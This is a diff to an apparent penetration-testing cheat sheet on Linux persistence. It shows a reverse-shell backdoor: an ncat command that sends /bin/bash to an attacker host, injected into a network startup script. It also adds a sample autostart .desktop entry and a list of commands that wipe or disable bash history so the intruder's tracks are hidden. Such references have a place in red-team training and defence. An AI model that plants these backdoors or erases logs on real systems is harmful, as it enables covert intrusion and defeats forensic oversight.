@@ -41,12 +41,27 @@ fi
 rm /tmp/$TMPNAME2
 ```
 
-
 ## Backdooring a startup service
 
 ```bash
 RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
 sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
+```
+
+## Backdooring an user startup file
+
+Linux, write a file in  `~/.config/autostart/NOM_OF_FILE.desktop`
+
+```powershell
+In : ~/.config/autostart/*.desktop
+
+[Desktop Entry]
+Type=Application
+Name=Welcome
+Exec=/var/lib/gnome-welcome-tour
+AutostartCondition=unless-exists ~/.cache/gnome-getting-started-docs/seen-getting-started-guide
+OnlyShowIn=GNOME;
+X-GNOME-Autostart-enabled=false
 ```
 
 ## Backdooring a driver
@@ -78,6 +93,26 @@ Clear the last line of the history.
 history -d $(history | tail -2 | awk '{print $1}') 2> /dev/null
 ```
 
+Clear history
+
+```bash
+[SPACE] ANY COMMAND
+or
+export HISTSIZE=0
+export HISTFILESIZE=0
+unset HISTFILE; CTRL-D
+or
+kill -9 $$
+or
+echo "" > ~/.bash_history
+or
+rm ~/.bash_history -rf
+or
+history -c
+or
+ln /dev/null ~/.bash_history -sf
+```
+
 The following directories are temporary and usually writeable
 
 ```bash
@@ -85,7 +120,6 @@ The following directories are temporary and usually writeable
 /tmp/
 /dev/shm/
 ```
-
 
 ## Thanks to
 
